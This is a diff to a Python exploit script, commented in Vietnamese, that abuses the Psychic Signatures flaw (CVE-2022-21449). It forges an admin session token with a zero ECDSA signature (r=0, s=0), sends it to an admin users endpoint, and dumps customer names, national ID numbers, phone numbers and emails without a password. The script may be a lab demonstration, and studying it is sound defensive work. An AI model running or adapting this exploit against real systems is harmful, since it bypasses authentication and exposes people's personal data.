@@ -1,14 +1,14 @@
 """TẤN CÔNG 2 — PSYCHIC SIGNATURES / CVE-2022-21449 (qua HTTP, API công khai thật).
 
 Chế tạo token phiên với chữ ký RỖNG (r=0, s=0). Hàm xác minh token của server bỏ
-bước kiểm tra r,s ∈ [1,n-1] nên chấp nhận → chiếm quyền admin, bung toàn bộ hồ sơ
+bước kiểm tra r,s ∈ [1,n-1] nên chấp nhận → chiếm quyền admin, lộ toàn bộ hồ sơ
 khách hàng (CCCD, SĐT, email) mà KHÔNG cần mật khẩu.
 
     python attack_psychic.py
 """
 import json
 
-from common import banner, step, info, ok, bad, impact, get, b64u
+from common import get, b64u
 
 
 def forge_admin_token():
@@ -21,34 +21,25 @@ def forge_admin_token():
 
 
 def main():
-    banner("TẤN CÔNG 2 — PSYCHIC SIGNATURES  →  chiếm admin, lộ toàn bộ PII")
+    print("=== Tấn công 2: PSYCHIC SIGNATURES (chữ ký (0,0)) ===")
 
-    step(1, "Thử GET /api/admin/users KHI CHƯA có token")
     st, _ = get("/api/admin/users")
-    info("HTTP status", st)
-    ok("Bị từ chối như mong đợi") if st != 200 else bad("(?) vào được")
+    print(f"Truy cập /api/admin/users khi chưa đăng nhập → HTTP {st} (bị từ chối).")
 
-    step(2, "Chế tạo token admin với chữ ký RỖNG (r=0, s=0)")
     token = forge_admin_token()
-    info("Token giả", token)
-
-    step(3, "Gửi lại request kèm token giả (cookie session_token)")
     st, res = get("/api/admin/users", cookie=f"session_token={token}")
-    info("HTTP status", st)
+    print(f"Gửi lại kèm token chữ ký (0,0) → HTTP {st}.")
     if st != 200 or not isinstance(res, dict):
-        return bad("Không vượt qua được xác thực.")
+        print("Không vượt qua được xác thực.")
+        return
 
     accts = res["accounts"]
-    ok(f"CHIẾM QUYỀN ADMIN — trích xuất {len(accts)} hồ sơ khách hàng")
-    print(f"\n    {'Tài khoản':<12}{'Họ tên':<20}{'CCCD':<14}{'Điện thoại':<12}Email")
-    print("    " + "-" * 74)
+    print(f"Chiếm quyền admin, lộ {len(accts)} hồ sơ khách hàng (không cần mật khẩu):")
     for a in accts[:8]:
-        print(f"    {a['user']:<12}{a.get('name',''):<20}{a.get('cccd',''):<14}"
-              f"{a.get('phone',''):<12}{a.get('email','')}")
+        print(f"  {a['user']:<10} {a.get('name',''):<18} {a.get('cccd','')}  "
+              f"{a.get('phone','')}  {a.get('email','')}")
     if len(accts) > 8:
-        print(f"    … và {len(accts) - 8} hồ sơ khác")
-
-    impact(f"Rò rỉ PII của toàn bộ {len(accts)} khách hàng, không cần mật khẩu")
+        print(f"  ... và {len(accts) - 8} hồ sơ khác")
 
 
 if __name__ == "__main__":
